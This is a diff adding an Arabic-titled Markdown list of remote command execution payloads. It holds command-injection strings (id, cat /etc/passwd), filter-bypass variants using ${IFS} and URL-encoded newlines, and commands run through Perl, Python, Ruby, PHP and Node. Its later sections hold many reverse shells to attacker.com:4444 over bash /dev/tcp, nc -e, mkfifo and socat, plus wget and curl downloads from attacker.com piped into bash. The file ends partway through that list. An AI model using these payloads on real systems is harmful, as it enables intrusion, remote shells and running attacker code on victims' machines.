@@ -1,0 +1,939 @@
+# RCE Payloads - قائمة بايلودات RCE موسعة
+
+## بايلودات أساسية
+;id
+|id
+`id`
+$(id)
+|| id
+&& id
+; ls -la
+| ls -la
+` ls -la`
+$(ls -la)
+|| ls -la
+&& ls -la
+; cat /etc/passwd
+| cat /etc/passwd
+` cat /etc/passwd`
+$(cat /etc/passwd)
+|| cat /etc/passwd
+&& cat /etc/passwd
+; uname -a
+| uname -a
+` uname -a`
+$(uname -a)
+|| uname -a
+&& uname -a
+; whoami
+| whoami
+` whoami`
+$(whoami)
+|| whoami
+&& whoami
+; pwd
+| pwd
+` pwd`
+$(pwd)
+|| pwd
+&& pwd
+; ps aux
+| ps aux
+` ps aux`
+$(ps aux)
+|| ps aux
+&& ps aux
+; netstat -an
+| netstat -an
+` netstat -an`
+$(netstat -an)
+|| netstat -an
+&& netstat -an
+; ifconfig
+| ifconfig
+` ifconfig`
+$(ifconfig)
+|| ifconfig
+&& ifconfig
+; ip a
+| ip a
+` ip a`
+$(ip a)
+|| ip a
+&& ip a
+
+## بايلودات تجاوز الفلترة
+;+id
+|+id
+`+id`
+$(+id)
+||+id
+&&+id
+; \id
+| \id
+` \id`
+$(\id)
+|| \id
+&& \id
+;%0Aid
+|%0Aid
+`%0Aid`
+$(%0Aid)
+||%0Aid
+&&%0Aid
+;%0a id
+|%0a id
+`%0a id`
+$(%0a id)
+||%0a id
+&&%0a id
+;%0did
+|%0did
+`%0did`
+$(%0did)
+||%0did
+&&%0did
+;%0d id
+|%0d id
+`%0d id`
+$(%0d id)
+||%0d id
+&&%0d id
+;${IFS}id
+|${IFS}id
+`${IFS}id`
+$(${IFS}id)
+||${IFS}id
+&&${IFS}id
+; ${IFS} id
+| ${IFS} id
+` ${IFS} id`
+$(${IFS} id)
+|| ${IFS} id
+&& ${IFS} id
+;%09id
+|%09id
+`%09id`
+$(%09id)
+||%09id
+&&%09id
+;%09 id
+|%09 id
+`%09 id`
+$(%09 id)
+||%09 id
+&&%09 id
+;id%0A
+|id%0A
+`id%0A`
+$(id%0A)
+||id%0A
+&&id%0A
+;id%0D
+|id%0D
+`id%0D`
+$(id%0D)
+||id%0D
+&&id%0D
+;id%09
+|id%09
+`id%09`
+$(id%09)
+||id%09
+&&id%09
+;{id}
+|{id}
+`{id}`
+$({id})
+||{id}
+&&{id}
+; { id }
+| { id }
+` { id }`
+$({{ id }})
+|| { id }
+&& { id }
+;id|
+|id|
+`id|`
+$(id|)
+||id|
+&&id|
+;id;
+|id;
+`id;`
+$(id;)
+||id;
+&&id;
+;id&
+|id&
+`id&`
+$(id&)
+||id&
+&&id&
+;id&&
+|id&&
+`id&&`
+$(id&&)
+||id&&
+&&id&&
+;id||
+|id||
+`id||`
+$(id||)
+||id||
+&&id||
+;(id)
+|(id)
+`(id)`
+$((id))
+||(id)
+&&(id)
+; ( id )
+| ( id )
+` ( id )`
+$(( id ))
+|| ( id )
+&& ( id )
+;id`
+|id`
+`id``
+$(id`)
+||id`
+&&id`
+;id$(id)
+|id$(id)
+`id$(id)`
+$(id$(id))
+||id$(id)
+&&id$(id)
+;id`id`
+|id`id`
+`id`id``
+$(id`id`)
+||id`id`
+&&id`id`
+;id|id
+|id|id
+`id|id`
+$(id|id)
+||id|id
+&&id|id
+;id;id
+|id;id
+`id;id`
+$(id;id)
+||id;id
+&&id;id
+;id&id
+|id&id
+`id&id`
+$(id&id)
+||id&id
+&&id&id
+;id&&id
+|id&&id
+`id&&id`
+$(id&&id)
+||id&&id
+&&id&&id
+;id||id
+|id||id
+`id||id`
+$(id||id)
+||id||id
+&&id||id
+;id>id
+|id>id
+`id>id`
+$(id>id)
+||id>id
+&&id>id
+;id<id
+|id<id
+`id<id`
+$(id<id)
+||id<id
+&&id<id
+;id>>id
+|id>>id
+`id>>id`
+$(id>>id)
+||id>>id
+&&id>>id
+;id<<id
+|id<<id
+`id<<id`
+$(id<<id)
+||id<<id
+&&id<<id
+;id 2>id
+|id 2>id
+`id 2>id`
+$(id 2>id)
+||id 2>id
+&&id 2>id
+;id 2>>id
+|id 2>>id
+`id 2>>id`
+$(id 2>>id)
+||id 2>>id
+&&id 2>>id
+;id 2>&1
+|id 2>&1
+`id 2>&1`
+$(id 2>&1)
+||id 2>&1
+&&id 2>&1
+;id 1>&2
+|id 1>&2
+`id 1>&2`
+$(id 1>&2)
+||id 1>&2
+&&id 1>&2
+;id 2>&1 | id
+|id 2>&1 | id
+`id 2>&1 | id`
+$(id 2>&1 | id)
+||id 2>&1 | id
+&&id 2>&1 | id
+;id 1>&2 | id
+|id 1>&2 | id
+`id 1>&2 | id`
+$(id 1>&2 | id)
+||id 1>&2 | id
+&&id 1>&2 | id
+;id > /dev/null
+|id > /dev/null
+`id > /dev/null`
+$(id > /dev/null)
+||id > /dev/null
+&&id > /dev/null
+;id 2> /dev/null
+|id 2> /dev/null
+`id 2> /dev/null`
+$(id 2> /dev/null)
+||id 2> /dev/null
+&&id 2> /dev/null
+;id &> /dev/null
+|id &> /dev/null
+`id &> /dev/null`
+$(id &> /dev/null)
+||id &> /dev/null
+&&id &> /dev/null
+;id > /dev/null 2>&1
+|id > /dev/null 2>&1
+`id > /dev/null 2>&1`
+$(id > /dev/null 2>&1)
+||id > /dev/null 2>&1
+&&id > /dev/null 2>&1
+;id 2> /dev/null 1>&2
+|id 2> /dev/null 1>&2
+`id 2> /dev/null 1>&2`
+$(id 2> /dev/null 1>&2)
+||id 2> /dev/null 1>&2
+&&id 2> /dev/null 1>&2
+;id < /dev/null
+|id < /dev/null
+`id < /dev/null`
+$(id < /dev/null)
+||id < /dev/null
+&&id < /dev/null
+;id << EOF
+|id << EOF
+`id << EOF`
+$(id << EOF)
+||id << EOF
+&&id << EOF
+;id <<< "EOF"
+|id <<< "EOF"
+`id <<< "EOF"`
+$(id <<< "EOF")
+||id <<< "EOF"
+&&id <<< "EOF"
+;id | id
+|id | id
+`id | id`
+$(id | id)
+||id | id
+&&id | id
+;id |& id
+|id |& id
+`id |& id`
+$(id |& id)
+||id |& id
+&&id |& id
+;id | id | id
+|id | id | id
+`id | id | id`
+$(id | id | id)
+||id | id | id
+&&id | id | id
+;id && id && id
+|id && id && id
+`id && id && id`
+$(id && id && id)
+||id && id && id
+&&id && id && id
+;id || id || id
+|id || id || id
+`id || id || id`
+$(id || id || id)
+||id || id || id
+&&id || id || id
+;id & id & id
+|id & id & id
+`id & id & id`
+$(id & id & id)
+||id & id & id
+&&id & id & id
+;id ; id ; id
+|id ; id ; id
+`id ; id ; id`
+$(id ; id ; id)
+||id ; id ; id
+&&id ; id ; id
+;id | tee id
+|id | tee id
+`id | tee id`
+$(id | tee id)
+||id | tee id
+&&id | tee id
+;id | tee -a id
+|id | tee -a id
+`id | tee -a id`
+$(id | tee -a id)
+||id | tee -a id
+&&id | tee -a id
+;id | xargs id
+|id | xargs id
+`id | xargs id`
+$(id | xargs id)
+||id | xargs id
+&&id | xargs id
+;id | grep id
+|id | grep id
+`id | grep id`
+$(id | grep id)
+||id | grep id
+&&id | grep id
+;id | awk '{print}'
+|id | awk '{print}'
+`id | awk '{print}'`
+$(id | awk '{print}')
+||id | awk '{print}'
+&&id | awk '{print}'
+;id | sed 's/id/id/g'
+|id | sed 's/id/id/g'
+`id | sed 's/id/id/g'`
+$(id | sed 's/id/id/g')
+||id | sed 's/id/id/g'
+&&id | sed 's/id/id/g'
+;id | cut -d: -f1
+|id | cut -d: -f1
+`id | cut -d: -f1`
+$(id | cut -d: -f1)
+||id | cut -d: -f1
+&&id | cut -d: -f1
+;id | tr 'id' 'id'
+|id | tr 'id' 'id'
+`id | tr 'id' 'id'`
+$(id | tr 'id' 'id')
+||id | tr 'id' 'id'
+&&id | tr 'id' 'id'
+;id | head -n 1
+|id | head -n 1
+`id | head -n 1`
+$(id | head -n 1)
+||id | head -n 1
+&&id | head -n 1
+;id | tail -n 1
+|id | tail -n 1
+`id | tail -n 1`
+$(id | tail -n 1)
+||id | tail -n 1
+&&id | tail -n 1
+;id | sort
+|id | sort
+`id | sort`
+$(id | sort)
+||id | sort
+&&id | sort
+;id | uniq
+|id | uniq
+`id | uniq`
+$(id | uniq)
+||id | uniq
+&&id | uniq
+;id | wc -l
+|id | wc -l
+`id | wc -l`
+$(id | wc -l)
+||id | wc -l
+&&id | wc -l
+;id | base64
+|id | base64
+`id | base64`
+$(id | base64)
+||id | base64
+&&id | base64
+;id | base64 -d
+|id | base64 -d
+`id | base64 -d`
+$(id | base64 -d)
+||id | base64 -d
+&&id | base64 -d
+;id | xxd
+|id | xxd
+`id | xxd`
+$(id | xxd)
+||id | xxd
+&&id | xxd
+;id | xxd -r
+|id | xxd -r
+`id | xxd -r`
+$(id | xxd -r)
+||id | xxd -r
+&&id | xxd -r
+;id | hexdump -C
+|id | hexdump -C
+`id | hexdump -C`
+$(id | hexdump -C)
+||id | hexdump -C
+&&id | hexdump -C
+;id | od -x
+|id | od -x
+`id | od -x`
+$(id | od -x)
+||id | od -x
+&&id | od -x
+;id | gzip
+|id | gzip
+`id | gzip`
+$(id | gzip)
+||id | gzip
+&&id | gzip
+;id | gzip -d
+|id | gzip -d
+`id | gzip -d`
+$(id | gzip -d)
+||id | gzip -d
+&&id | gzip -d
+;id | bzip2
+|id | bzip2
+`id | bzip2`
+$(id | bzip2)
+||id | bzip2
+&&id | bzip2
+;id | bzip2 -d
+|id | bzip2 -d
+`id | bzip2 -d`
+$(id | bzip2 -d)
+||id | bzip2 -d
+&&id | bzip2 -d
+;id | tar -cf -
+|id | tar -cf -
+`id | tar -cf -`
+$(id | tar -cf -)
+||id | tar -cf -
+&&id | tar -cf -
+;id | tar -xf -
+|id | tar -xf -
+`id | tar -xf -`
+$(id | tar -xf -)
+||id | tar -xf -
+&&id | tar -xf -
+;id | zip -
+|id | zip -
+`id | zip -`
+$(id | zip -)
+||id | zip -
+&&id | zip -
+;id | unzip -
+|id | unzip -
+`id | unzip -`
+$(id | unzip -)
+||id | unzip -
+&&id | unzip -
+;id | perl -e 'print <>'
+|id | perl -e 'print <>'
+`id | perl -e 'print <>'`
+$(id | perl -e 'print <>')
+||id | perl -e 'print <>'
+&&id | perl -e 'print <>'
+;id | python -c 'import sys; print(sys.stdin.read())'
+|id | python -c 'import sys; print(sys.stdin.read())'
+`id | python -c 'import sys; print(sys.stdin.read())'`
+$(id | python -c 'import sys; print(sys.stdin.read())')
+||id | python -c 'import sys; print(sys.stdin.read())'
+&&id | python -c 'import sys; print(sys.stdin.read())'
+;id | ruby -e 'puts STDIN.read'
+|id | ruby -e 'puts STDIN.read'
+`id | ruby -e 'puts STDIN.read'`
+$(id | ruby -e 'puts STDIN.read')
+||id | ruby -e 'puts STDIN.read'
+&&id | ruby -e 'puts STDIN.read'
+;id | php -r 'echo file_get_contents("php://stdin");'
+|id | php -r 'echo file_get_contents("php://stdin");'
+`id | php -r 'echo file_get_contents("php://stdin");'`
+$(id | php -r 'echo file_get_contents("php://stdin");')
+||id | php -r 'echo file_get_contents("php://stdin");'
+&&id | php -r 'echo file_get_contents("php://stdin");'
+;id | node -e 'console.log(require("fs").readFileSync(0).toString())'
+|id | node -e 'console.log(require("fs").readFileSync(0).toString())'
+`id | node -e 'console.log(require("fs").readFileSync(0).toString())'`
+$(id | node -e 'console.log(require("fs").readFileSync(0).toString())')
+||id | node -e 'console.log(require("fs").readFileSync(0).toString())'
+&&id | node -e 'console.log(require("fs").readFileSync(0).toString())'
+
+## بايلودات تنفيذ الأوامر عبر لغات البرمجة
+;perl -e 'system("id")'
+|perl -e 'system("id")'
+`perl -e 'system("id")'`
+$(perl -e 'system("id")')
+||perl -e 'system("id")'
+&&perl -e 'system("id")'
+;python -c 'import os; os.system("id")'
+|python -c 'import os; os.system("id")'
+`python -c 'import os; os.system("id")'`
+$(python -c 'import os; os.system("id")')
+||python -c 'import os; os.system("id")'
+&&python -c 'import os; os.system("id")'
+;ruby -e 'system("id")'
+|ruby -e 'system("id")'
+`ruby -e 'system("id")'`
+$(ruby -e 'system("id")')
+||ruby -e 'system("id")'
+&&ruby -e 'system("id")'
+;php -r 'system("id");'
+|php -r 'system("id");'
+`php -r 'system("id");'`
+$(php -r 'system("id");')
+||php -r 'system("id");'
+&&php -r 'system("id");'
+;node -e 'require("child_process").exec("id", (error, stdout, stderr) => { console.log(stdout); })'
+|node -e 'require("child_process").exec("id", (error, stdout, stderr) => { console.log(stdout); })'
+`node -e 'require("child_process").exec("id", (error, stdout, stderr) => { console.log(stdout); })'`
+$(node -e 'require("child_process").exec("id", (error, stdout, stderr) => { console.log(stdout); })')
+||node -e 'require("child_process").exec("id", (error, stdout, stderr) => { console.log(stdout); })'
+&&node -e 'require("child_process").exec("id", (error, stdout, stderr) => { console.log(stdout); })'
+;lua -e 'os.execute("id")'
+|lua -e 'os.execute("id")'
+`lua -e 'os.execute("id")'`
+$(lua -e 'os.execute("id")')
+||lua -e 'os.execute("id")'
+&&lua -e 'os.execute("id")'
+;perl -e 'exec("id")'
+|perl -e 'exec("id")'
+`perl -e 'exec("id")'`
+$(perl -e 'exec("id")')
+||perl -e 'exec("id")'
+&&perl -e 'exec("id")'
+;python -c 'import os; os.popen("id").read()'
+|python -c 'import os; os.popen("id").read()'
+`python -c 'import os; os.popen("id").read()'`
+$(python -c 'import os; os.popen("id").read()')
+||python -c 'import os; os.popen("id").read()'
+&&python -c 'import os; os.popen("id").read()'
+;ruby -e 'exec("id")'
+|ruby -e 'exec("id")'
+`ruby -e 'exec("id")'`
+$(ruby -e 'exec("id")')
+||ruby -e 'exec("id")'
+&&ruby -e 'exec("id")'
+;php -r 'exec("id");'
+|php -r 'exec("id");'
+`php -r 'exec("id");'`
+$(php -r 'exec("id");')
+||php -r 'exec("id");'
+&&php -r 'exec("id");'
+;node -e 'require("child_process").spawn("id", [], {shell: true}).stdout.on("data", (data) => { console.log(data.toString()); })'
+|node -e 'require("child_process").spawn("id", [], {shell: true}).stdout.on("data", (data) => { console.log(data.toString()); })'
+`node -e 'require("child_process").spawn("id", [], {shell: true}).stdout.on("data", (data) => { console.log(data.toString()); })'`
+$(node -e 'require("child_process").spawn("id", [], {shell: true}).stdout.on("data", (data) => { console.log(data.toString()); })')
+||node -e 'require("child_process").spawn("id", [], {shell: true}).stdout.on("data", (data) => { console.log(data.toString()); })'
+&&node -e 'require("child_process").spawn("id", [], {shell: true}).stdout.on("data", (data) => { console.log(data.toString()); })'
+;perl -e 'print `id`'
+|perl -e 'print `id`'
+`perl -e 'print `id``
+$(perl -e 'print `id`')
+||perl -e 'print `id`'
+&&perl -e 'print `id`'
+;python -c 'import subprocess; print(subprocess.check_output("id", shell=True))'
+|python -c 'import subprocess; print(subprocess.check_output("id", shell=True))'
+`python -c 'import subprocess; print(subprocess.check_output("id", shell=True))'`
+$(python -c 'import subprocess; print(subprocess.check_output("id", shell=True))')
+||python -c 'import subprocess; print(subprocess.check_output("id", shell=True))'
+&&python -c 'import subprocess; print(subprocess.check_output("id", shell=True))'
+;ruby -e 'puts `id`'
+|ruby -e 'puts `id`'
+`ruby -e 'puts `id``
+$(ruby -e 'puts `id`')
+||ruby -e 'puts `id`'
+&&ruby -e 'puts `id`'
+;php -r 'echo `id`;'
+|php -r 'echo `id`;'
+`php -r 'echo `id`;'`
+$(php -r 'echo `id`;')
+||php -r 'echo `id`;'
+&&php -r 'echo `id`;'
+;node -e 'console.log(require("child_process").execSync("id").toString())'
+|node -e 'console.log(require("child_process").execSync("id").toString())'
+`node -e 'console.log(require("child_process").execSync("id").toString())'`
+$(node -e 'console.log(require("child_process").execSync("id").toString())')
+||node -e 'console.log(require("child_process").execSync("id").toString())'
+&&node -e 'console.log(require("child_process").execSync("id").toString())'
+;perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attacker.com:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+|perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attacker.com:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+`perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attacker.com:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`
+$(perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attacker.com:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;')
+||perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attacker.com:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+&&perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attacker.com:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+|python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+$(python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);')
+||python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+&&python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+;ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+|ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+`ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`
+$(ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end')
+||ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+&&ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+;php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+|php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+`php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`
+$(php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");')
+||php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+&&php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+;node -e 'const net = require("net"), cp = require("child_process"); var sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(4444, "attacker.com", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); });'
+|node -e 'const net = require("net"), cp = require("child_process"); var sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(4444, "attacker.com", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); });'
+`node -e 'const net = require("net"), cp = require("child_process"); var sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(4444, "attacker.com", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); });'`
+$(node -e 'const net = require("net"), cp = require("child_process"); var sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(4444, "attacker.com", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); });')
+||node -e 'const net = require("net"), cp = require("child_process"); var sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(4444, "attacker.com", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); });'
+&&node -e 'const net = require("net"), cp = require("child_process"); var sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(4444, "attacker.com", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); });'
+
+## بايلودات تنفيذ الأوامر عبر الشل
+;/bin/bash -c "id"
+|/bin/bash -c "id"
+`/bin/bash -c "id"`
+$(/bin/bash -c "id")
+||/bin/bash -c "id"
+&&/bin/bash -c "id"
+;/bin/sh -c "id"
+|/bin/sh -c "id"
+`/bin/sh -c "id"`
+$(/bin/sh -c "id")
+||/bin/sh -c "id"
+&&/bin/sh -c "id"
+;/bin/zsh -c "id"
+|/bin/zsh -c "id"
+`/bin/zsh -c "id"`
+$(/bin/zsh -c "id")
+||/bin/zsh -c "id"
+&&/bin/zsh -c "id"
+;/bin/dash -c "id"
+|/bin/dash -c "id"
+`/bin/dash -c "id"`
+$(/bin/dash -c "id")
+||/bin/dash -c "id"
+&&/bin/dash -c "id"
+;/bin/ksh -c "id"
+|/bin/ksh -c "id"
+`/bin/ksh -c "id"`
+$(/bin/ksh -c "id")
+||/bin/ksh -c "id"
+&&/bin/ksh -c "id"
+;/bin/tcsh -c "id"
+|/bin/tcsh -c "id"
+`/bin/tcsh -c "id"`
+$(/bin/tcsh -c "id")
+||/bin/tcsh -c "id"
+&&/bin/tcsh -c "id"
+;/bin/csh -c "id"
+|/bin/csh -c "id"
+`/bin/csh -c "id"`
+$(/bin/csh -c "id")
+||/bin/csh -c "id"
+&&/bin/csh -c "id"
+;/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1
+|/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1
+`/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1`
+$(/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1)
+||/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1
+&&/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1
+;/bin/sh -i >& /dev/tcp/attacker.com/4444 0>&1
+|/bin/sh -i >& /dev/tcp/attacker.com/4444 0>&1
+`/bin/sh -i >& /dev/tcp/attacker.com/4444 0>&1`
+$(/bin/sh -i >& /dev/tcp/attacker.com/4444 0>&1)
+||/bin/sh -i >& /dev/tcp/attacker.com/4444 0>&1
+&&/bin/sh -i >& /dev/tcp/attacker.com/4444 0>&1
+;/bin/bash -c '/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1'
+|/bin/bash -c '/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1'
+`/bin/bash -c '/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1'`
+$(/bin/bash -c '/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1')
+||/bin/bash -c '/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1'
+&&/bin/bash -c '/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1'
+;/bin/sh -c '/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1'
+|/bin/sh -c '/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1'
+`/bin/sh -c '/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1'`
+$(/bin/sh -c '/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1')
+||/bin/sh -c '/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1'
+&&/bin/sh -c '/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1'
+;bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
+|bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
+`bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"`
+$(bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1")
+||bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
+&&bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
+;sh -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
+|sh -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
+`sh -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"`
+$(sh -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1")
+||sh -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
+&&sh -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
+;nc -e /bin/bash attacker.com 4444
+|nc -e /bin/bash attacker.com 4444
+`nc -e /bin/bash attacker.com 4444`
+$(nc -e /bin/bash attacker.com 4444)
+||nc -e /bin/bash attacker.com 4444
+&&nc -e /bin/bash attacker.com 4444
+;nc -e /bin/sh attacker.com 4444
+|nc -e /bin/sh attacker.com 4444
+`nc -e /bin/sh attacker.com 4444`
+$(nc -e /bin/sh attacker.com 4444)
+||nc -e /bin/sh attacker.com 4444
+&&nc -e /bin/sh attacker.com 4444
+;nc -c /bin/bash attacker.com 4444
+|nc -c /bin/bash attacker.com 4444
+`nc -c /bin/bash attacker.com 4444`
+$(nc -c /bin/bash attacker.com 4444)
+||nc -c /bin/bash attacker.com 4444
+&&nc -c /bin/bash attacker.com 4444
+;nc -c /bin/sh attacker.com 4444
+|nc -c /bin/sh attacker.com 4444
+`nc -c /bin/sh attacker.com 4444`
+$(nc -c /bin/sh attacker.com 4444)
+||nc -c /bin/sh attacker.com 4444
+&&nc -c /bin/sh attacker.com 4444
+;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
+|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
+`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f`
+$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f)
+||rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
+&&rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
+;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc attacker.com 4444 >/tmp/f
+|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc attacker.com 4444 >/tmp/f
+`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc attacker.com 4444 >/tmp/f`
+$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc attacker.com 4444 >/tmp/f)
+||rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc attacker.com 4444 >/tmp/f
+&&rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc attacker.com 4444 >/tmp/f
+;socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.com:4444
+|socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.com:4444
+`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.com:4444`
+$(socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.com:4444)
+||socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.com:4444
+&&socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.com:4444
+;socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:attacker.com:4444
+|socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:attacker.com:4444
+`socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:attacker.com:4444`
+$(socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:attacker.com:4444)
+||socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:attacker.com:4444
+&&socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:attacker.com:4444
+;wget -q -O- http://attacker.com/shell.sh | bash
+|wget -q -O- http://attacker.com/shell.sh | bash
+`wget -q -O- http://attacker.com/shell.sh | bash`
+$(wget -q -O- http://attacker.com/shell.sh | bash)
+||wget -q -O- http://attacker.com/shell.sh | bash
+&&wget -q -O- http://attacker.com/shell.sh | bash
+;wget -q -O- http://attacker.com/shell.sh | sh
+|wget -q -O- http://attacker.com/shell.sh | sh
+`wget -q -O- http://attacker.com/shell.sh | sh`
+$(wget -q -O- http://attacker.com/shell.sh | sh)
+||wget -q -O- http://attacker.com/shell.sh | sh
+&&wget -q -O- http://attacker.com/shell.sh | sh
+;curl -s http://attacker.com/shell.sh | bash
+|curl -s http://attacker.com/shell.sh | bash
